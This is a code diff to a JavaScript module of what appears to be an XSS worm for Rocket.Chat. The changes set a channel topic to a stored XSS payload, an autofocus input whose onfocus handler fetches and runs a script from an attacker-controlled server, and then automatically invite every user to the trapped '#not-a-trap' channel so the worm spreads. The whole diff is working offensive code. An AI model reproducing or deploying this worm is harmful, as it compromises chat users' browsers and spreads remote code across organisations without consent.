@@ -8,10 +8,8 @@
  * 
  */
 
-define({
 
-    // User their jQuery to chain load our script
-    payload:  '$.getScript("' + __ld_server + '/js/little-doctor.js")',
+define({
 
     propagate: function() {
         if (navigator.userAgent.indexOf("Rocket.Chat") > -1) {
@@ -21,14 +19,24 @@ define({
     },
 
     infectChannel: function() {
-        this.sendMessage('/create #not-a-trap', 1);
-        this.sendMessage('/open #not-a-trap', 1);
-        this.sendMessage('/topic NOT-A-TRAP<input onfocus="' + payload + '" autofocus="autofocus">', 250);
         var users = this.listUsers();
-        for (var index = 0; index < users.length; ++index) {
-            console.log('Sending invite to: ' + users[index]);
-            this.sendMessage('/invite ' + users[index] + ' #not-a-trap', 250);
-        }
+        var payload = encodeURI('console.log(1);$.getScript(\'' + __ld_server + '/js/little-doctor.js\');');
+       
+        var _this = this;
+        setTimeout(function() {
+            
+            // Set the topic to the XSS payload
+            _this.setTopic('NOT-A-TRAP<input type="text" autofocus onfocus="' + payload + '">');
+            setTimeout(function() {
+                
+                // Invite all users
+                for (var index = 0; index < users.length; ++index) {
+                    console.log('Sending invite to: ' + users[index]);
+                    _this.sendInvite(users[index]);
+                }
+
+            }, 500);
+        }, 500);
     },
 
     listUsers: function() {
@@ -39,6 +47,30 @@ define({
         }
         console.log(users);
         return Array.from(users);
+    },
+
+    getChatWindowId: function() {
+        var chatWindow = $('[id^=chat-window-')[0].id;
+        var rid = chatWindow.split('chat-window-')[1];
+        console.log('Chat Window ID is: ' + rid);
+        return rid;
+    },
+
+    setTopic: function(topic) {
+        console.log('Set topic to: ' + topic);
+        RocketChat.slashCommands.run('topic', topic, {
+            _id: "asdfasdfasdf",
+            rid: this.getChatWindowId(),
+            msg: "/topic " + topic
+        });
+    },
+
+    sendInvite: function(user) {
+        RocketChat.slashCommands.run('invite', user, {
+            _id: "asdfasdfasdf2",
+            rid: this.getChatWindowId(),
+            msg: "/invite " + user
+        });
     },
 
     sendMessage: function(message, delay) {
@@ -55,8 +87,8 @@ define({
                     } else {
                         console.log('Error: Could not find send-message');
                     }
-                }, 50);
-            }, delay || 10);
+                }, 100);
+            }, delay || 100);
         } else {
             console.log('Error: Could not find input-message');
         }
